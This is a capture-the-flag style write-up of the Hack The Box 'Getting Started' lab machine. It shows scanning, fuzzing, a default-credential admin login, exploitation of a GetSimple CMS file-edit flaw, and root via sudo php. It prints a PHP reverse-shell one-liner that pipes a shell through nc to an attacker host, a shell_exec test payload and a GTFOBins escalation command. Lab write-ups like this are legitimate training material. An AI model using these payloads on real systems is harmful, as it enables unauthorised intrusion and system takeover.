---
description: Knowledge Check write-up.
---

# Knowledge Check

The _Getting Started_ module represents a taste of what's coming on later in the next modules.\
Since we'll go in depth or each technique like transferring files, privilege escalation and more, we'll go through the Knowledge Check part directly.

{% hint style="info" %}
This is just a taste of the HTB labs and machines. The machine is straight forward with the most basic exposed vulnerabilities:

1. A disallowed entry on robots.txt.
2. An admin login portal.
3. Default creds.
4. A specific CMS version having a CVE for a file upload vulnerability.
5. sudo misconfig to be leveraged to root. &#x20;
{% endhint %}

## 0. Connecting to VPN:

I don't use the pwnbox, so i need to connect to their network using the openVPN file they provide.

```bash
└──╼ $sudo openvpn <path-to-vpn-file>
```

## 1. Enumeration & Information Gathering:

### Nmap:

```bash
└──╼ $nmap <target-ip> -Pn -T4 -sC -sV -oA nmap-def-initial-scan
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption><p>Initial nmap output.</p></figcaption></figure>

We already got some interesting stuff, a Linux machine hosting an Apache server with port 80 open, an accessible robots.txt file containing a disallowed entry /admin. \
So upon checking the IP on port 80 here's what we got:

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

First we'll associate this IP address to a domain name to easily access it with a domain name:

```bash
└──╼ $sudo sh -c 'echo "<target-ip> gettingstarted.htb" >> /etc/hosts'
# Another way of doing it:
└──╼ $echo "<target-ip> gettingstarted.htb" | sudo tee -a /etc/hosts
```

\
After checking what GetSimple is i run into this phrase:\


> "GetSimple CMS allows you to create a dynamic site to your image, easy updation of content            without limit by administration system."

Sounds, juicy enough for us.

\
So we'll let a full nmap scan or all ports run in the background just to make sure we didn't oversee any available portal on  a port that's not on the top 1000 ports.

```bash
└──╼ $nmap gettingstarted.htb -p- -T4 -Pn -oA full-ports-scan
```

First thing that comes to mind before jumping on that admin portal, is checking for any hidden subdirectories, subdomains, vhosts, pages ..etc because we may get too invested in that admin directory and oversee some low hanging fruit on others.

### Directory Fuzzing:

We'll use "directory-list-2.3-small.txt" from SecLists repo. We can even check the common.txt one before, it's up to you.

```bash
└──╼ $ffuf -w <path-to-wordlist>:FUZZ -u http://1gettingstarted.htb/FUZZ
```

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Intuitively after poking around the discovered directories, we visit the admin login page :

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

After using some default credentials, we successfully got a login to the admin's dashboard, pretty easy:

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

And we got the GetSimple CMS version 3.3.15 that has a public vulnerability: CVE-2019-11231, which is ,as described in [https://nvd.nist.gov/vuln/detail/CVE-2019-11231](https://nvd.nist.gov/vuln/detail/CVE-2019-11231) a file upload vulnerability in the _**theme-edit.php**_ file that might allow us to upload to the file with arbitrary code like PHP. \
If it is indeed vulnerable we can easily obtain a reverse shell!\
Let's check if it is vulnerable:\
\
Navigating to the theme-edit.php file we found a php code to which we can add this PHP line to test if it goes through:  <mark style="color:red;">**`<?php echo shell_exec('id'); ?>`**</mark>

So after saving, we check the main page in order for the server to execute our payload and it is indeed vulnerable and effectively  printed out the output of the `id` command in the bottom of the page:

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

## 2. Exploitation & Getting a foothold :

As already shown in [#id-1.-reverse-shells](shells-and-ssh/setting-up-shells.md#id-1.-reverse-shells "mention") we can now inject a reverse shell using the following PHP code:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENEING PORT> >/tmp/f"); ?>
```

Let's now set up a listener on the port already specified:

```bash
└──╼ $nc -nlvp 9999
listening on [any] 9999 ..
```

Then navigate to the http://gettingstarted/ page in order to execute the code. Meanwhile we should keep an eye on the netcat listener we sat up, and a successful connection should pop out :

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption><p>Successful Rev Shell</p></figcaption></figure>

After upgrading the Reverse shell as instructed in [#id-3.-upgrading-tty](shells-and-ssh/setting-up-shells.md#id-3.-upgrading-tty "mention")

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption><p>Getting the user flag</p></figcaption></figure>

## Privilege escalation:

Before going to enumerate using automated scripts (like linpeas.sh), let's have a look for the available sudo privileges: \
`sudo -l` command will list all the possible sudo privileges, as said in the documentation:

> -l \[l] \[_command_]\
> If no _command_ is specified, the -l (_list_) option will list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. If a _command_ is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments.

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption><p>Showing that we can execute the /usr/bin/php<br>as a root without authentication.</p></figcaption></figure>

Going to [https://gtfobins.github.io/gtfobins/php/](https://gtfobins.github.io/gtfobins/php/), we find a bash script to exploit this vulnerability and get a shell with elevated privileges:

```bash
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
<mark style="color:blue;">Instead of defining a variable containing the '/bin/sh' string i simply put it into the function parameter. It does the same job, same result.</mark>

<mark style="color:blue;">We can still upgrade the shell of the root user as we did to the basic user but since we only need to read the flag without any complex procedures, it would be an overkill.</mark>
{% endhint %}

{% hint style="success" %}
<mark style="color:green;">We successfully got a shell as the root user we can now get user flag located in /root/root.txt.</mark>
{% endhint %}

{% hint style="warning" %}
<mark style="color:orange;">A good thing to do after pwning a machine is to stay on it and move around to find our how it is configured and what else could be done. Since it is a controlled environment, it's a chance to try out different things, payloads ..etc</mark>&#x20;

<mark style="color:orange;">AND OF COURSE NOT DOSing it.</mark>
{% endhint %}

